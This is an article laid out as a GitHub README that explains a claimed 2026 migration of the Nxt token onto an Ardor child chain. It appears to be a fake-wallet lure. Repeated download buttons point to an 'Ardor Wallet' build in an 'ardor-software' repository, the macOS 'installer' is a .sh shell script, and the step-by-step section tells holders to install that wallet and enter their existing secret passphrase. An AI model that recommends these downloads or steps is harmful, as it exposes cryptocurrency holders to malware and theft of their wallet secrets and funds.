![Ardor Wallet guide](assets/banner-article.png)

# What happened to the Nxt chain, and where the token is now

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Nxt stopped producing its own blocks at block 6,000,000 on 17 January 2026 and continued as a child chain of Ardor from block 4,333,333 on 1 February 2026. Every Nxt balance was migrated automatically, so the token did not disappear: the same account, opened with the same secret, now shows it on the Ardor platform.

## What actually changed

The standalone Nxt blockchain ended its own block generation. What replaced it is not a copy and not a swap: the Nxt [child chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) runs on Ardor, secured by Ardor's forgers, and it keeps the balances that existed at the final Nxt block.

For a holder, the practical result is that the secret still opens the account and the [Ardor balance](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-balance-shows-zero.md) is still there. What changed is the chain the account is read on, the wallet used to read it, and the set of features available beside it. Nothing needs to be moved between addresses, and the account ID does not change.

## Where the balance went

Balances were migrated automatically. There was no claim window, no swap [contract](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-lightweight-contracts.md) and no action required, which is the part most people miss after reading about other chains' migrations.

| Question | Answer |
|---|---|
| Do I need to claim or swap NXT? | No. The migration was automatic. |
| Do I need a specific wallet version? | The platform's migration notes state no wallet version requirement. Install the current release. |
| Where do I see the balance? | In the Ardor wallet, with the Nxt child chain selected. |
| Can I still use an old NXT address? | The account is derived from the secret. Open it in the current wallet and read the address the wallet shows for that chain. |

If a balance does not appear, the cause is almost always the chain selector or an unfinished [sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md) rather than a lost migration. Check the address the wallet derives before assuming anything was left behind.

## What the Nxt child chain gained

Migrating onto Ardor did not just preserve balances. The proposal set out a child chain with the platform's features beside it: aliases, the coin exchange, the asset exchange, the monetary system, the voting system, the data cloud and shuffling. NXT can also trade on Ardor's coin exchange against other child chain tokens and against ARDR.

That is a different proposition from the old standalone chain, where those features either did not exist or sat in a separate ecosystem. It also means the wallet a Nxt holder needs is the Ardor wallet, not a Nxt-specific client.

## Why the change happened

Jelurida described reduced usage of the standalone Nxt chain as the reason for moving it onto Ardor. A chain with its own forgers carries its own security cost, and consolidating onto the parent chain puts one set of forgers behind both.

For a holder the trade-off is straightforward: the same balance, a broader feature set, and one wallet to install instead of two. The cost is that the old chain's independent history stops where it stopped, which matters to anyone reading old block explorers or reconstructing a transaction from years ago.

## Why holders were told to check balances

The platform's update after the child chain went live asked holders to compare their Nxt balance on Ardor with the balance they held at the final Nxt block. That is a verification request rather than a warning: it gives every holder a way to confirm the migration reached their own account without having to trust an announcement, and it gives the maintainers a way to hear about exceptions while the chain was still fresh.

Doing that comparison is cheap. A screenshot from before 17 January 2026, an old export or a note is enough, and the check takes a minute once the wallet has reached the chain.

## Reading old information correctly

A lot of material about Nxt predates the migration and now reads as though nothing changed. The most common confusions are worth naming:

- Posts saying Nxt and Ardor are separate projects describe the period before the migration, not the current arrangement.
- Threads about "the NXT wallet shows my Ardor" describe the 2018 Ardor launch, when Ardor balances appeared as assets inside Nxt wallets. They are not about the 2026 migration.
- Guides that name a Nxt-only wallet are describing software that no longer matches where the chain runs.

None of that is a reason to distrust the balance. It is a reason to check the date on a guide before following it, and a reason to prefer the wallet's own screens over any third-party description of what a Nxt holder should see. The account is the source of truth; a guide written before the migration cannot describe an account that only exists after it.

## What to do now

1. Install the current Ardor wallet release and start it.
2. Enter your existing secret on the passphrase tab.
3. Select the Nxt child chain and confirm the balance matches what you held at the final Nxt block.
4. Publish the public key when the account has sat idle for years, so no colliding secret can claim the shortened address.
5. Move the balance only after the check, and only to an address you control.

The comparison in step three is the one the platform's own migration notes suggest, and it is the cheapest way to confirm that nothing was missed.

## FAQ

### Is NXT still a separate blockchain?

No. It stopped producing its own blocks in January 2026 and runs as a child chain of Ardor, secured by Ardor's forgers.

### Do I need to do anything to keep my NXT?

No. Balances were migrated automatically, with no claim and no swap. Open the account in the current wallet and select the Nxt child chain.

### Can I still trade NXT?

Yes, on Ardor's coin exchange, where it trades against other child chain tokens and against ARDR.

### Why does my old NXT wallet not show the balance?

Because it reads the chain that stopped. Use the Ardor wallet with the same secret and select the Nxt child chain.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [The Nxt migration to Ardor, step by step for holders](https://github.com/ardor-software/ardor-platform-guides/blob/main/nxt-migration-to-ardor-explained.md)
- [Ardor child chains explained, including one passphrase for all](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
